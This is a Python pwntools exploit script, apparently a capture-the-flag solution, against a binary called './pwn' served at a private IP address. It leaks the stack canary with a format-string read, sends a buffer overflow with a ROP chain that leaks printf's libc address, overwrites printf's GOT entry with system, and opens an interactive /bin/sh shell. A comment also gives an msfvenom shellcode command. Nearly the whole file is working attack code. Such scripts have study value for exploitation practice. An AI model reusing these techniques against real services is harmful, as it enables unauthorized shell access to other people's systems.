#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-13 21:20:40
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./pwn"
remote_ip = "192.168.5.81"
port = 8000
rop = roputils.ROP(target)
libc = ELF("./libc.so.6")
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'

if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	# gdb.attach(p,"b*0x080485BC\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

ru("name:")

sl("%31$X")

ru("29 ctf!\n")
canary = int(p.recv(8),16)

ropchain  = rop.call('printf', rop.got('printf'))
ropchain += rop.call('gets', rop.got('printf'))
ropchain += rop.call('printf', rop.got('printf')+4)

payload = (0x7c-0x18)*"a"+p32(canary)+0xc*"a"
payload +=ropchain

sl(payload)

ru("essages:")
printf_addr = u32(p.recv(4))

print "printf_addr = " +hex(printf_addr)
system_addr = printf_addr - (libc.symbols["printf"] - libc.symbols["system"])

sl(p32(system_addr)+"/bin/sh\x00")

p.interactive()